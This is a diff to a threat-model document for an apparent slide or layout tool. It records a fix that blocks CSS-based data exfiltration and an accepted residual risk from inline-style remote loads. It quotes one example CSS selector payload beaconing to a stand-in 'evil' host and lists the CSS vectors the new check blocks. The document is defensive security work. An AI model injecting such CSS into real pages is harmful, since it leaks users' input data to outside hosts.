@@ -147,9 +147,16 @@ same severity as T2.
   (`[value^="a"]{background:url(//evil/a)}`) — defeating the on-device confidentiality
   goal (Asset #3) with no script at all. **Closed (#616):** `findCssExfil` in
   `lib/layout/gate.js` now flags `@import`, remote `url()`, `expression()`,
-  `-moz-binding`, and `javascript:`/`vbscript:` as blocking gate errors; inline
-  `data:` URIs and `#fragment` refs (non-network) stay allowed so the legit
-  inline-icon pattern survives.
+  `-moz-binding`, and `javascript:`/`vbscript:` as blocking gate errors (CSS escapes
+  are decoded first, and `image-set()`'s bare-string targets are scanned, so an
+  obfuscated or wrapper-less remote fetch can't dodge it); inline `data:` URIs and
+  `#fragment` refs (non-network) stay allowed so the legit inline-icon pattern survives.
+  **Residual (accepted):** this closes the attacker-authored *component CSS* channel.
+  A remote `url()` in an *inline `style=`* on untrusted deck **content** is deliberately
+  NOT stripped by the HTML sanitizer — it's a no-script resource load of the same trust
+  as an `<img src>` / `![bg]` background (both already allowed), so it's a low-severity
+  beacon, not key-theft. Hardening content inline-style `url()` (and `<img>`/`![bg]`
+  remote loads) is a separate, lower-priority surface, not part of #616.
 
 ## 6. Decision
 
